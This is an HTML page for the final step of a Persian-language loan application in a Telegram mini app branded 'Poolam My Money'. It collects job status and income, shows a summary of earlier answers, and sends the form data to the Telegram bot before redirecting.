<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>درخواست قرضه‌ - نتیجه</title>

    <!-- ✅ FIXED Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f8fafc;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .nav-header {
            width: 100%;
            background: linear-gradient(135deg, #f26522, #0072bc);
            padding: 15px 20px;
            color: white;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-sizing: border-box;
        }

        .waafi-logo {
            font-size: 20px;
            font-weight: bold;
        }

        .form-card {
            background: white;
            width: 92%;
            max-width: 480px;
            margin-top: 25px;
            padding: 30px 20px;
            border-radius: 15px;
            box-shadow: 0 8px 20px rgba(242,101,34,0.12);
            box-sizing: border-box;
        }

        h2 {
            text-align: center;
            margin: 0;
            font-size: 24px;
            color: #1a202c;
            font-weight: 600;
        }

        .step-info {
            text-align: center;
            font-size: 14px;
            color: #718096;
            margin: 10px 0 25px;
        }

        .progress-box {
            display: flex;
            gap: 8px;
            margin-bottom: 35px;
        }

        .bar {
            height: 4px;
            flex: 1;
            background: #f26522;
            border-radius: 2px;
        }

        .input-wrap {
            margin-bottom: 22px;
        }

        label {
            display: block;
            font-size: 15px;
            font-weight: 500;
            margin-bottom: 10px;
            color: #2d3748;
        }

        select, input {
            width: 100%;
            padding: 15px;
            border: 1px solid #cbd5e0;
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;
            background: #fff;
            color: #2d3748;
            font-family: inherit;
        }

        select:focus, input:focus {
            border-color: #f26522;
            outline: none;
        }

        .summary-box {
            background-color: #fff8f5;
            border-right: 5px solid #f26522;
            border-left: none;
            padding: 20px;
            border-radius: 8px;
            margin: 25px 0;
        }

        .summary-box h3 {
            margin: 0 0 15px 0;
            font-size: 17px;
            font-weight: 700;
            color: #1a202c;
        }

        .summary-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
            border-bottom: 1px solid #fed7aa;
            padding-bottom: 8px;
        }

        .summary-label {
            color: #718096;
            font-size: 14px;
        }

        .summary-value {
            font-weight: 600;
            font-size: 14px;
            color: #2d3748;
            text-align: left;
        }

        .btn-container {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .back-btn {
            background: #edf2f7;
            color: #4a5568;
            border: 1px solid #cbd5e0;
            padding: 16px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        .submit-btn {
            background: linear-gradient(135deg, #f26522, #ea580c);
            color: white;
            border: none;
            padding: 18px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(242,101,34,0.25);
        }

        .footer-text {
            text-align: center;
            font-size: 12px;
            color: #a0aec0;
            margin: 40px 0 30px;
        }
    </style>
</head>

<body>

<div class="nav-header">
    <div onclick="goBack()" style="cursor:pointer; font-size:16px;">← برگشت</div>
    <div class="waafi-logo">Poolam My Money</div>
    <div style="font-size: 22px;">☰</div>
</div>

<div class="form-card">
    <h2>درخواست قرضه‌</h2>
    <p class="step-info">مرحله ۳ از ۳</p>

    <div class="progress-box">
        <div class="bar"></div>
        <div class="bar"></div>
        <div class="bar"></div>
    </div>

    <div class="input-wrap">
        <label>وضعیت شغلی</label>
        <select id="jobStatus">
            <option value="مندمند / کارمند">کارمند</option>
            <option value="سوداګر">تاجر / سوداگر</option>
            <option value="محصل / زده کونکی">محصل / دانش‌آموز</option>
            <option value="بې کاره">بی‌کار</option>
            <option value="تقاعد شوی">متقاعد</option>
        </select>
    </div>

    <div class="input-wrap">
        <label>عاید سالانه (AFN)</label>
        <input type="text" id="income" placeholder="مثال: ۲۵۰۰۰۰">
    </div>

    <div class="summary-box">
        <h3>خلاصه درخواست</h3>

        <div class="summary-item">
            <span class="summary-label">مقدار قرضه‌:</span>
            <span class="summary-value" id="sumAmount">--</span>
        </div>

        <div class="summary-item">
            <span class="summary-label">مدت قرضه‌:</span>
            <span class="summary-value" id="sumDuration">--</span>
        </div>

        <div class="summary-item">
            <span class="summary-label">هدف:</span>
            <span class="summary-value" id="sumPurpose">--</span>
        </div>

        <div class="summary-item">
            <span class="summary-label">درخواست‌کننده:</span>
            <span class="summary-value" id="sumName">--</span>
        </div>
    </div>

    <div class="btn-container">
        <button type="button" class="submit-btn" onclick="submitForm()">ارسال درخواست</button>
        <button type="button" class="back-btn" onclick="goBack()">قبلی</button>
    </div>
</div>

<div class="footer-text">© 2026 Poolam My Money Afghanistan. تمامی حقوق محفوظ است.</div>

<script>
window.onload = () => {
    const tg = window.Telegram?.WebApp;
    if (tg) {
        tg.ready();
        tg.expand();
    }

    const amount = localStorage.getItem('amount');
    const duration = localStorage.getItem('loanDuration');
    const purpose = localStorage.getItem('loanPurpose');
    const fName = localStorage.getItem('firstName') || "";
    const lName = localStorage.getItem('lastName') || "";

    document.getElementById('sumAmount').innerText = amount ? `AFN ${Number(amount).toLocaleString()}` : "--";
    document.getElementById('sumDuration').innerText = duration || "--";
    document.getElementById('sumPurpose').innerText = purpose || "--";
    document.getElementById('sumName').innerText = `${fName} ${lName}`.trim() || "--";
};

function submitForm() {
    const tg = window.Telegram?.WebApp;

    const data = {
        amount: localStorage.getItem('amount'),
        duration: localStorage.getItem('loanDuration'),
        purpose: localStorage.getItem('loanPurpose'),
        firstName: localStorage.getItem('firstName'),
        lastName: localStorage.getItem('lastName'),
        phone: localStorage.getItem('phone'),
        jobStatus: document.getElementById('jobStatus').value,
        income: document.getElementById('income').value
    };

    if (tg && tg.sendData) {
        tg.sendData(JSON.stringify(data));
        setTimeout(() => {
            window.location.href = "/page5";
        }, 500);
    } else {
        console.log("Submitted:", data);
        window.location.href = "/page5";
    }
}

function goBack() {
    window.location.href = "/page3";
}
</script>

</body>
</html>
